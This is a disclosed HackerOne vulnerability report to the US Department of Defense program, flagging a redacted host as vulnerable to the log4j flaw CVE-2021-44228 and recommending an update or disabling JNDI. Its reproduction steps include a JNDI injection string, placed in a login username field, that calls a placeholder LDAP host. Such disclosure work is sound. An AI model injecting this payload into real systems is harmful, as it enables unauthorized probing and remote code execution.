# ██████████ running a vulnerable log4j

## Report Details
- **Report ID**: 1423496
- **URL**: https://hackerone.com/reports/1423496
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2021-12-11T00:16:38.725Z
- **Disclosed**: 2022-01-19T19:33:44.463Z

## Reporter
- **Username**: alex_gaynor
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Description:**

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228

## Impact

Probably arbitrary code execution

## System Host(s)
████████

## Affected Product(s) and Version(s)


## CVE Numbers
CVE-2021-44228

## Steps to Reproduce
1. Browse to https://████████/███████https%3A%2F%2F█████████%2F
2. Enter a `${jndi:ldap://dns-server-yoi-control/a}` into the username field
3. Enter a random password
4. Submit

Observe that a request was made to your DNS server. This strongly suggests a vulnerable log4j.

## Suggested Mitigation/Remediation Actions
Update log4j or disable jndi support.



## Attachments
No attachments
